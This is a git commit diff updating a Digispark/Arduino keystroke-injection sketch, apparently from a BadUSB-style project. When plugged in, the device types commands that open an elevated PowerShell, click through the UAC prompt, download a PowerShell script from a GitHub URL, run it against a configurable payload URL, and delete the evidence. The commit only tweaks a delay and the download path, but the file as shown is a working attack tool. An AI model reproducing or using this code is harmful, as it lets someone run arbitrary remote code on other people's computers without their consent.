403477168566b0a479904032041886493cb5e439
Phorcys <64284419+phorcysed@users.noreply.github.com>
2020-07-05 22:32:55 +0200

    Update main_fr.c

--- runPayload/main_fr.c
+++ runPayload/main_fr.c
@@ -1,4 +1,4 @@
-#include <DigiKeyboardFr.h>//https://www.arduinolibraries.info/libraries/digi-keyboard-fr -- put in the same directory as DigiKeyboard.h
+#include <DigiKeyboardFr.h>
 char* payloadUrl = "none";
 
 void setup() {
@@ -14,12 +14,12 @@ void setup() {
     DigiKeyboardFr.sendKeyStroke(KEY_FR_R, MOD_GUI_LEFT);//WIN+R
     DigiKeyboard.delay(1500);
     DigiKeyboardFr.println("powershell Start-Process powershell -Verb runAs");
-    DigiKeyboard.delay(3000);
+    DigiKeyboard.delay(2500);
     DigiKeyboardFr.sendKeyStroke(KEY_ARROW_LEFT);
     DigiKeyboard.delay(500);
     DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(500);
-    DigiKeyboardFr.println("(New-Object Net.Webclient).DownloadFile(\"https://raw.githubusercontent.com/phorcysed/StupidSpark/master/run.ps1\",\"o.ps1\")");
+    DigiKeyboardFr.println("(New-Object Net.Webclient).DownloadFile(\"https://raw.githubusercontent.com/phorcysed/StupidSpark/master/runPayload/run.ps1\",\"o.ps1\")");
     DigiKeyboardFr.print(".\\o.ps1 \"");
     DigiKeyboardFr.print(payloadUrl);
     DigiKeyboardFr.println("\"; Remove-Item o.ps1; exit");
